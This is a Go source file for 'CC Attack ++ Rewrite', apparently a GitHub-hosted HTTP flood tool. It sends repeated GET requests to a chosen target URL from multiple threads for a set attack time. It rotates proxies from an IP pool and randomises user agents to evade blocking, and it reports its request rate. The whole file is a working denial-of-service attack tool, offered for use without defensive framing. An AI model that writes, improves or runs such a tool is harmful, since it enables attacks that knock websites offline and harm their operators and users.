// Name : CC Attack ++ Rewrite
// Author : MasonDye
// Version : 2.3.0
// GitHub : https://github.com/MasonDye/CC-Attack-Rewrite

package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var version = "2.3.0 (Releases 2024/4/21 21:00 PM)"

func main() {
	targetURL := flag.String("url", "", "Attack URL")
	requestInterval := flag.Int("speed", 100, "Attack Speed(ms)")
	timeout := flag.Int("timeout", 2500, "Request Timeout (ms)")
	userAgentFile := flag.String("ua", "", "User-Agent Pool Path (txt)")
	proxyListFile := flag.String("ip", "", "IP Pool Path (txt)")
	threadCount := flag.Int("thread", 2, "thread")
	httpVersion := flag.Float64("http", 1.1, "HTTP version (1.1 or 2.0)")
	attackTime := flag.Int("time", 0, "Attack Time (seconds)")
	cookie := flag.String("cookie", "", "Cookie to include in request")

	flag.Parse()

	if *targetURL == "" {
		fmt.Println("\033[31mCC Attack ++ Rewrite \033[34mVersion:", version, "\033[0m")
		fmt.Println("\033[32mAuthor: MasonDye\033[0m")
		fmt.Println("\033[32mGitHub: https://github.com/MasonDye/CC-Attack-Rewrite\033[0m")
		fmt.Println() // Add blank line

		fmt.Println("\033[31mUsage:\033[0m")
		flag.VisitAll(func(f *flag.Flag) {
			fmt.Printf("\033[32m  -%s\033[0m\n        %s\n", f.Name, f.Usage)
		})
		return
	}

	// Check if HTTP version is valid
	if *httpVersion != 1.1 && *httpVersion != 2.0 {
		fmt.Println("\033[31mInvalid HTTP version. Please use 1.1 or 2.0.\033[0m")
		return
	}

	var proxyList []string
	if *proxyListFile != "" {
		var err error
		proxyList, err = readProxyList(*proxyListFile)
		if err != nil {
			fmt.Println("Failed to read IP Pool file:", err)
			return
		}
	}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
	if *userAgentFile != "" {
		userAgentList, err := readUserAgentList(*userAgentFile)
		if err != nil {
			fmt.Println("Failed to read User-Agent file:", err)
			return
		}
		rand.Seed(time.Now().UnixNano())
		userAgent = getRandomUserAgent(userAgentList)
	}

	successCount := 0
	errorCount := 0 // Add error counter
	startTime := time.Now()

	var wg sync.WaitGroup // Add Wait Group

	// Welcome and version
	fmt.Println("\033[32mCC Attack ++ \033[31m|\033[34m Version:", version, "\033[0m")

	// Print attack start
	fmt.Println("\033[31mStart Attack!\033[0m")

	proxyCount := len(proxyList) // Proxy Count

	for i := 0; i < *threadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			client := &http.Client{
				Timeout: time.Duration(*timeout) * time.Millisecond,
			}

			for {
				if proxyCount > 0 { // If proxy available
					proxyURL := getRandomProxy(proxyList)
					transport := &http.Transport{
						Proxy: http.ProxyURL(proxyURL),
					}
					client.Transport = transport
				}

				req, err := http.NewRequest("GET", *targetURL, nil)
				if err != nil {
					fmt.Println("Request creation failed:", err)
					continue
				}

				req.Header.Set("User-Agent", userAgent)

				// Set HTTP version
				if *httpVersion == 2.0 {
					req.Proto = "HTTP/2.0"
				} else {
					req.Proto = "HTTP/1.1"
				}

				// Add cookie to request if provided
				if *cookie != "" {
					req.Header.Set("Cookie", *cookie)
				}

				resp, err := client.Do(req)
				if err != nil {
					// fmt.Println("Request failed to send:", err)
					errorCount++ // Increase error counter
					continue
				}

				successCount++
				elapsed := time.Since(startTime).Seconds()
				requestsPerSecond := float64(successCount) / elapsed
				// Print attack info
				fmt.Printf("\r\033[31mRequested:%d \033[0m|\033[31m %.1f p/s \033[0m|\033[31m URL:%s \033[0m|\033[31m Thread:%d \033[0m|\033[31m Speed:%d \033[0m|\033[31m Timeout:%d \033[0m|\033[31m Error:%d \033[0m", successCount, requestsPerSecond, *targetURL, *threadCount, *requestInterval, *timeout, errorCount)

				resp.Body.Close()

				// Check if attack time is reached
				if *attackTime > 0 && int(time.Since(startTime).Seconds()) >= *attackTime {
					fmt.Println("\n\033[31mStopping attack...\033[0m")
					os.Exit(0)
				}

				time.Sleep(time.Duration(*requestInterval) * time.Millisecond)
			}
		}()
	}

	wg.Wait() // Waiting for all co-programs to finish executing
}

func readProxyList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxyList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		proxyList = append(proxyList, proxy)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxyList, nil
}

func readUserAgentList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var userAgentList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		userAgent := strings.TrimSpace(scanner.Text())
		userAgentList = append(userAgentList, userAgent)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return userAgentList, nil
}

func getRandomProxy(proxyList []string) *url.URL {
	if len(proxyList) == 0 {
		return nil
	}

	randIndex := rand.Intn(len(proxyList))
	proxyURL, _ := url.Parse("http://" + proxyList[randIndex])
	return proxyURL
}

func getRandomUserAgent(userAgentList []string) string {
	if len(userAgentList) == 0 {
		return ""
	}

	randIndex := rand.Intn(len(userAgentList))
	return userAgentList[randIndex]
}
